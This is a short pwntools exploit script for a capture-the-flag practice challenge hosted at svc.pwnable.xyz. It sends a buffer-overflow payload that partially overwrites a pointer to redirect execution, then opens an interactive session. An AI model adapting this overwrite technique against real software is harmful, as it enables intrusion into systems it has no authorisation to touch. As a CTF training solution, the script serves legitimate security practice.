from pwn import *

elf = context.binary = ELF("challenge", checksec=False)
libc = elf.libc
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
break *edit_name+42
c
'''

# r = gdb.debug(elf.path, gdbscript=gs)
r = remote("svc.pwnable.xyz", 30009)

r.recvuntil(": ")
r.send("A" * 16)

def play_game(solve):
    r.recvuntil(">")
    r.sendline("1")
    
    if not solve:
        r.recvuntil("=")
        r.sendline("0")

def save_game():
    r.recvuntil(">")
    r.sendline("2")

def edit_name():
    payload = b"A" * 24 + b'\xd6'+b'\x09'+b'\x40'
    r.recvuntil(">")
    r.sendline("3")
    r.send(payload)


play_game(False)
save_game()
edit_name()
play_game(True)
r.interactive()
